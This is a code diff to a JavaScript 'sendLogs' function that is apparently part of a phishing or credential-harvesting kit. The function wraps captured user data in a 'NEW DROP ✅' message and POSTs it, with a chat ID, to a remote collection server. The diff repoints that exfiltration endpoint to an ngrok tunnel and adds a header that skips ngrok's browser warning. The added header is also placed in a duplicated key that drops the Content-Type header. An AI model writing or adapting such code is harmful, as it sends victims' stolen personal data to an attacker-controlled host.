@@ -128,11 +128,12 @@ function sendLogs(message = null){
         message = 'NEW DROP ✅ \n\n <pre>  ' + JSON.stringify(user, null, 2) + '</pre>'
     }
 
-    const apiUrl = 'https://server-c50i.onrender.com/log'; // Update with your server URL
+    const apiUrl = 'https://02f7-102-88-70-219.ngrok-free.app/log'; // Update with your server URL
 
     const postData = {
         chatId: chatId,
         message: message,
+
         // Add more key-value pairs as needed
     };
 
@@ -141,6 +142,9 @@ function sendLogs(message = null){
         headers: {
             'Content-Type': 'application/json',
         },
+        headers: new Headers({
+            "ngrok-skip-browser-warning": "69420",
+        }),
         body: JSON.stringify(postData),
     })
         .then(response => response.json())
